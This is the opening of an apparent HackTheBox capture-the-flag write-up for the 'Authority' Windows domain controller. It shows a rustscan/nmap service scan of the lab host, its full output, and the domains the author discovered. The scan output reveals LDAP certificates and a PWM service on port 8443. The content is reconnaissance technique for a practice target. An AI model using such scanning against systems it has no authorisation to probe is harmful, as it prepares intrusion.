![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/70cc2b79-3cd4-431c-b8d0-a0eadd584656)![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/757bec12-b6cc-44f3-81f4-86bc2ba7f908)

https://app.hackthebox.com/machines/Authority

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

### Port scanning:

I began the enumeration by conducting a port and service scan using Rustscan. The scan revealed multiple open ports running on the machine:

```bash
sudo rustscan -a 10.10.11.222 -- -sC -sV -vv -oN authority_nmap
```

```Rust
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-07-19 19:04:29Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1
| SHA-1: dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDETMBEGCgmSJomT8ixkARkWA2h0YjEZ
| MBcGA1UEAxMQaHRiLUFVVEhPUklUWS1DQTAeFw0yMjA4MDkyMzAzMjFaFw0yNDA4
| MDkyMzEzMjFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVsJL0
| ae0n8L0Eg5BAHi8Tmzmbe+kIsXM6NZvAuqGgUsWNzsT4JNWsZqrRoHMr+kMC4kpX
| 4QuOHTe74iyB8TvucgvwxKEi9uZl6C5unv3WNFhZ9KoTOCno26adxqKPbzS5KQtk
| ZCvQfqQKOML0DuzA86kwh4uY0SjVR+biRj4IkkokWrPDWzzow0gCpO5HNcKPhSTl
| kAfdmdQRPjkXQq3h2QnfYAwOMGoGeCiA1whIo/dvFB6T9Kx4Vdcwi6Hkg4CwmbSF
| CHGbeNGtMGeWw/s24QWZ6Ju3J7uKFxDXoWBNLi4THL72d18jcb+i4jYlQQ9bxMfI
| zWQRur1QXvavmIM5AgMBAAGjggLxMIIC7TA9BgkrBgEEAYI3FQcEMDAuBiYrBgEE
| AYI3FQiEsb4Mh6XAaYK5iwiG1alHgZTHDoF+hKv0ccfMXgIBZAIBAjAyBgNVHSUE
| KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
| AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBTE4oKGc3Jv
| tctii3A/pyevpIBM/TAfBgNVHSMEGDAWgBQrzmT6FcxmkoQ8Un+iPuEpCYYPfTCB
| zQYDVR0fBIHFMIHCMIG/oIG8oIG5hoG2bGRhcDovLy9DTj1odGItQVVUSE9SSVRZ
| LUNBLENOPWF1dGhvcml0eSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1odGIsREM9Y29ycD9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaB
| n2xkYXA6Ly8vQ049aHRiLUFVVEhPUklUWS1DQSxDTj1BSUEsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1o
| dGIsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlm
| aWNhdGlvbkF1dGhvcml0eTBUBgNVHREBAf8ESjBIoCMGCisGAQQBgjcUAgOgFQwT
| QVVUSE9SSVRZJEBodGIuY29ycIISYXV0aG9yaXR5Lmh0Yi5jb3JwgghodGIuY29y
| cIIDSFRCMA0GCSqGSIb3DQEBCwUAA4IBAQCH8O6l8pRsA/pyKKsSSkie8ijDhCBo
| zoOuHiloC694xvs41w/Yvj9Z0oLiIkroSFPUPTDZOFqOLuFSDbnDNtKamzfbSfJR
| r4rj3F3r7S3wwK38ElkoD8RbqDiCHan+2bSf7olB1AdS+xhp9IZvBWZOlT0xXjr5
| ptIZERSRTRE8qyeX7+I4hpvGTBjhvdb5LOnG7spc7F7UHk79Z+C3BWG19tyS4fw7
| /9jm2pW0Maj1YEnX7frbYtYlO7iQ3KeDw1PSCMhMlipovbCpMJ1YOX9yeQgvvcg0
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-19T19:05:36+00:00; +4h00m00s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1
| SHA-1: dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDETMBEGCgmSJomT8ixkARkWA2h0YjEZ
| MBcGA1UEAxMQaHRiLUFVVEhPUklUWS1DQTAeFw0yMjA4MDkyMzAzMjFaFw0yNDA4
| MDkyMzEzMjFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVsJL0
| ae0n8L0Eg5BAHi8Tmzmbe+kIsXM6NZvAuqGgUsWNzsT4JNWsZqrRoHMr+kMC4kpX
| 4QuOHTe74iyB8TvucgvwxKEi9uZl6C5unv3WNFhZ9KoTOCno26adxqKPbzS5KQtk
| ZCvQfqQKOML0DuzA86kwh4uY0SjVR+biRj4IkkokWrPDWzzow0gCpO5HNcKPhSTl
| kAfdmdQRPjkXQq3h2QnfYAwOMGoGeCiA1whIo/dvFB6T9Kx4Vdcwi6Hkg4CwmbSF
| CHGbeNGtMGeWw/s24QWZ6Ju3J7uKFxDXoWBNLi4THL72d18jcb+i4jYlQQ9bxMfI
| zWQRur1QXvavmIM5AgMBAAGjggLxMIIC7TA9BgkrBgEEAYI3FQcEMDAuBiYrBgEE
| AYI3FQiEsb4Mh6XAaYK5iwiG1alHgZTHDoF+hKv0ccfMXgIBZAIBAjAyBgNVHSUE
| KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
| AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBTE4oKGc3Jv
| tctii3A/pyevpIBM/TAfBgNVHSMEGDAWgBQrzmT6FcxmkoQ8Un+iPuEpCYYPfTCB
| zQYDVR0fBIHFMIHCMIG/oIG8oIG5hoG2bGRhcDovLy9DTj1odGItQVVUSE9SSVRZ
| LUNBLENOPWF1dGhvcml0eSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1odGIsREM9Y29ycD9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaB
| n2xkYXA6Ly8vQ049aHRiLUFVVEhPUklUWS1DQSxDTj1BSUEsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1o
| dGIsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlm
| aWNhdGlvbkF1dGhvcml0eTBUBgNVHREBAf8ESjBIoCMGCisGAQQBgjcUAgOgFQwT
| QVVUSE9SSVRZJEBodGIuY29ycIISYXV0aG9yaXR5Lmh0Yi5jb3JwgghodGIuY29y
| cIIDSFRCMA0GCSqGSIb3DQEBCwUAA4IBAQCH8O6l8pRsA/pyKKsSSkie8ijDhCBo
| zoOuHiloC694xvs41w/Yvj9Z0oLiIkroSFPUPTDZOFqOLuFSDbnDNtKamzfbSfJR
| r4rj3F3r7S3wwK38ElkoD8RbqDiCHan+2bSf7olB1AdS+xhp9IZvBWZOlT0xXjr5
| ptIZERSRTRE8qyeX7+I4hpvGTBjhvdb5LOnG7spc7F7UHk79Z+C3BWG19tyS4fw7
| /9jm2pW0Maj1YEnX7frbYtYlO7iQ3KeDw1PSCMhMlipovbCpMJ1YOX9yeQgvvcg0
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-19T19:05:36+00:00; +4h00m00s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1
| SHA-1: dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDETMBEGCgmSJomT8ixkARkWA2h0YjEZ
| MBcGA1UEAxMQaHRiLUFVVEhPUklUWS1DQTAeFw0yMjA4MDkyMzAzMjFaFw0yNDA4
| MDkyMzEzMjFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVsJL0
| ae0n8L0Eg5BAHi8Tmzmbe+kIsXM6NZvAuqGgUsWNzsT4JNWsZqrRoHMr+kMC4kpX
| 4QuOHTe74iyB8TvucgvwxKEi9uZl6C5unv3WNFhZ9KoTOCno26adxqKPbzS5KQtk
| ZCvQfqQKOML0DuzA86kwh4uY0SjVR+biRj4IkkokWrPDWzzow0gCpO5HNcKPhSTl
| kAfdmdQRPjkXQq3h2QnfYAwOMGoGeCiA1whIo/dvFB6T9Kx4Vdcwi6Hkg4CwmbSF
| CHGbeNGtMGeWw/s24QWZ6Ju3J7uKFxDXoWBNLi4THL72d18jcb+i4jYlQQ9bxMfI
| zWQRur1QXvavmIM5AgMBAAGjggLxMIIC7TA9BgkrBgEEAYI3FQcEMDAuBiYrBgEE
| AYI3FQiEsb4Mh6XAaYK5iwiG1alHgZTHDoF+hKv0ccfMXgIBZAIBAjAyBgNVHSUE
| KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
| AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBTE4oKGc3Jv
| tctii3A/pyevpIBM/TAfBgNVHSMEGDAWgBQrzmT6FcxmkoQ8Un+iPuEpCYYPfTCB
| zQYDVR0fBIHFMIHCMIG/oIG8oIG5hoG2bGRhcDovLy9DTj1odGItQVVUSE9SSVRZ
| LUNBLENOPWF1dGhvcml0eSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1odGIsREM9Y29ycD9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaB
| n2xkYXA6Ly8vQ049aHRiLUFVVEhPUklUWS1DQSxDTj1BSUEsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1o
| dGIsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlm
| aWNhdGlvbkF1dGhvcml0eTBUBgNVHREBAf8ESjBIoCMGCisGAQQBgjcUAgOgFQwT
| QVVUSE9SSVRZJEBodGIuY29ycIISYXV0aG9yaXR5Lmh0Yi5jb3JwgghodGIuY29y
| cIIDSFRCMA0GCSqGSIb3DQEBCwUAA4IBAQCH8O6l8pRsA/pyKKsSSkie8ijDhCBo
| zoOuHiloC694xvs41w/Yvj9Z0oLiIkroSFPUPTDZOFqOLuFSDbnDNtKamzfbSfJR
| r4rj3F3r7S3wwK38ElkoD8RbqDiCHan+2bSf7olB1AdS+xhp9IZvBWZOlT0xXjr5
| ptIZERSRTRE8qyeX7+I4hpvGTBjhvdb5LOnG7spc7F7UHk79Z+C3BWG19tyS4fw7
| /9jm2pW0Maj1YEnX7frbYtYlO7iQ3KeDw1PSCMhMlipovbCpMJ1YOX9yeQgvvcg0
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-19T19:05:36+00:00; +4h00m00s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1
| SHA-1: dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDETMBEGCgmSJomT8ixkARkWA2h0YjEZ
| MBcGA1UEAxMQaHRiLUFVVEhPUklUWS1DQTAeFw0yMjA4MDkyMzAzMjFaFw0yNDA4
| MDkyMzEzMjFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVsJL0
| ae0n8L0Eg5BAHi8Tmzmbe+kIsXM6NZvAuqGgUsWNzsT4JNWsZqrRoHMr+kMC4kpX
| 4QuOHTe74iyB8TvucgvwxKEi9uZl6C5unv3WNFhZ9KoTOCno26adxqKPbzS5KQtk
| ZCvQfqQKOML0DuzA86kwh4uY0SjVR+biRj4IkkokWrPDWzzow0gCpO5HNcKPhSTl
| kAfdmdQRPjkXQq3h2QnfYAwOMGoGeCiA1whIo/dvFB6T9Kx4Vdcwi6Hkg4CwmbSF
| CHGbeNGtMGeWw/s24QWZ6Ju3J7uKFxDXoWBNLi4THL72d18jcb+i4jYlQQ9bxMfI
| zWQRur1QXvavmIM5AgMBAAGjggLxMIIC7TA9BgkrBgEEAYI3FQcEMDAuBiYrBgEE
| AYI3FQiEsb4Mh6XAaYK5iwiG1alHgZTHDoF+hKv0ccfMXgIBZAIBAjAyBgNVHSUE
| KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
| AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBTE4oKGc3Jv
| tctii3A/pyevpIBM/TAfBgNVHSMEGDAWgBQrzmT6FcxmkoQ8Un+iPuEpCYYPfTCB
| zQYDVR0fBIHFMIHCMIG/oIG8oIG5hoG2bGRhcDovLy9DTj1odGItQVVUSE9SSVRZ
| LUNBLENOPWF1dGhvcml0eSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1odGIsREM9Y29ycD9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaB
| n2xkYXA6Ly8vQ049aHRiLUFVVEhPUklUWS1DQSxDTj1BSUEsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1o
| dGIsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlm
| aWNhdGlvbkF1dGhvcml0eTBUBgNVHREBAf8ESjBIoCMGCisGAQQBgjcUAgOgFQwT
| QVVUSE9SSVRZJEBodGIuY29ycIISYXV0aG9yaXR5Lmh0Yi5jb3JwgghodGIuY29y
| cIIDSFRCMA0GCSqGSIb3DQEBCwUAA4IBAQCH8O6l8pRsA/pyKKsSSkie8ijDhCBo
| zoOuHiloC694xvs41w/Yvj9Z0oLiIkroSFPUPTDZOFqOLuFSDbnDNtKamzfbSfJR
| r4rj3F3r7S3wwK38ElkoD8RbqDiCHan+2bSf7olB1AdS+xhp9IZvBWZOlT0xXjr5
| ptIZERSRTRE8qyeX7+I4hpvGTBjhvdb5LOnG7spc7F7UHk79Z+C3BWG19tyS4fw7
| /9jm2pW0Maj1YEnX7frbYtYlO7iQ3KeDw1PSCMhMlipovbCpMJ1YOX9yeQgvvcg0
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-19T19:05:36+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt syn-ack ttl 127
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Wed, 19 Jul 2023 19:04:37 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Wed, 19 Jul 2023 19:04:35 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Wed, 19 Jul 2023 19:04:35 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Wed, 19 Jul 2023 19:04:43 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-17T16:33:22
| Not valid after:  2025-07-19T04:11:46
| MD5:   cea1 8f52 a52b ea12 b6b4 33ac dacd fb88
| SHA-1: 8b0c 775c 4406 3e12 ff4f 1450 70e3 99a1 88af 4e55
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIGEmZU0nb6MA0GCSqGSIb3DQEBCwUAMBcxFTATBgNVBAMM
| DDE3Mi4xNi4yLjExODAeFw0yMzA3MTcxNjMzMjJaFw0yNTA3MTkwNDExNDZaMBcx
| FTATBgNVBAMMDDE3Mi4xNi4yLjExODCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBAJcDZlNGHGVmWnajGm9qKa33KpJpJHtePeSOTn5ikdO39ObuQQHBRMXb
| NdBysJaR2NRf7Ue+Xe+sYTp0NRIKo7832gR15vPaRGpA7z/XJ40dFWAplfllaEXw
| uIomh1qmCY7y12QN7U3B/+ToAD9QDqu4W+SFHYXxApAeXi+ADvRvcoc1Nqk/vXJT
| cg1wx+dR1t/DGwnc8RnxWQ7PNlEDD1CAKE7IoiYM6C/3dyXOBnTwYM3wlBDJqWlz
| TEefbVSYbqsxp4QVkE1R726weoiEdGClRVmy5I0RmhWQDeOyKw9LLiAgu3Yt1aDk
| HZpGvrPOdUOzg0mrl8CmgeHCIphePbkCAwEAAaM4MDYwDAYDVR0TAQH/BAIwADAO
| BgNVHQ8BAf8EBAMCBaAwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwEwDQYJKoZIhvcN
| AQELBQADggEBAAelPX3C2vx1r/sjaWzxJ7z/eWi1netyOex9QnweCXPo8v5f7bm3
| DkE24YsYOBUQ3IBDBnyMMRm85RXFbgaZq+kNxEuGPyhGVRVS7u8m97eVK4Z5wxwq
| s+w7t4QE+GvZQkQdlqTVv2ZWGCeD3on04BvO5Vjl9N616JHaRzgr3gJhhZ+oPwLt
| FNiS5ZxDBbuL6QJllYlXYG4DXZGiVyFaOyOXchfhX2WPA70iC9xymijpt26vFYv2
| CuQTMdyf+nheVmEX2suW7trKfbTjd3OY4YR7yKjD2Z5lamrgNAL8w3Cp686nyqMq
| BWF6iKL/bOj54LUGpLcBiASsdFTyZ4pA5jc=
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50784/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=7/19%Time=64B7FB83%P=x86_64-unknown-lin
SF:ux-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/h
SF:tml;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Wed,\x2019\
SF:x20Jul\x202023\x2019:04:35\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n
SF:\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pw
SF:m'\"/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:
SF:\x20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\
SF:x20Wed,\x2019\x20Jul\x202023\x2019:04:35\x20GMT\r\nConnection:\x20close
SF:\r\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type
SF::\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20
SF:Wed,\x2019\x20Jul\x202023\x2019:04:37\x20GMT\r\nConnection:\x20close\r\
SF:n\r\n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\
SF:"0;URL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x
SF:20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20
SF:en\r\nContent-Length:\x201936\r\nDate:\x20Wed,\x2019\x20Jul\x202023\x20
SF:19:04:43\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\
SF:x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Ba
SF:d\x20Request</title><style\x20type=\"text/css\">body\x20{font-family:Ta
SF:homa,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backg
SF:round-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16
SF:px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{colo
SF:r:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none
SF:;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad
SF:\x20Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\
SF:x20Report</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x
SF:20the\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p
SF:><p><b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\
SF:x20process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x2
SF:0perceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malforme
SF:d\x20request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 3h59m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 34798/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64473/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45856/udp): CLEAN (Timeout)
|   Check 4 (port 37545/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-19T19:05:30
|_  start_date: N/A
```

From the scan results, I observed the presence of two domains on the machine:

```
- htb.corp
- authority.htb.corp
```

I added both of these domains to my host configuration file for further investigation.

